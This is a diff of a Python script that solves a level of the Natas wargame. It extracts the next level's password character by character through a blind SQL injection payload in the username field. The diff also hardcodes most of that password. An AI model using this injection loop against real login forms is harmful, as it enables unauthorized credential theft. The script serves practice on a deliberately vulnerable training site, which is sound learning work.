@@ -39,12 +39,12 @@ correct_password = open(pathDirectory + "password.txt", 'r').readlines()[14][8:4
 allString = string.ascii_uppercase + string.ascii_lowercase + string.digits
 print(allString)
 
-natasPassword = list()
+natasPassword = list('hPkjKYviLQctEW33QmuXL6eDVfMW4sG')
 
-while (True):
+while (len(natasPassword) < 32):
     for character in allString:
         cast = "".join(natasPassword) + character
-        print("Testing string:", cast)
+        print("(*) Testing string:", cast)
 
         data = {
             'username': f'natas16" AND BINARY password LIKE  "{cast}%" #',
@@ -54,23 +54,22 @@ while (True):
             # 'submit': 'Login'
         response = requests.post(url + 'index.php' , auth = (userName, correct_password), data = data)
         htmlDoc = response.text
-        print(htmlDoc)
+        # print(htmlDoc)
 
-        try:
-            with open(pathDirectory + "scripts\\temp\\result.html", 'w') as htmlFinalContent:
-                htmlFinalContent.writelines(htmlDoc)
-                print("(+) first page is stored successfully on the path as result.html")
-        except IOError as err:
-            print(f"(-) unfortunately {err}")
+        # try:
+        #     with open(pathDirectory + "scripts\\temp\\result.html", 'w') as htmlFinalContent:
+        #         htmlFinalContent.writelines(htmlDoc)
+        #         print("(+) first page is stored successfully on the path as result.html")
+        # except IOError as err:
+        #     print(f"(-) unfortunately {err}")
 
         if ('user exist' in htmlDoc):
             natasPassword.append(character)
             print()
             break
     
-        if len(natasPassword) == 32:
-            print("👌Done")
-            break
+
+print("(+) Task accomplished, password:", "".join(natasPassword))
 
 
 
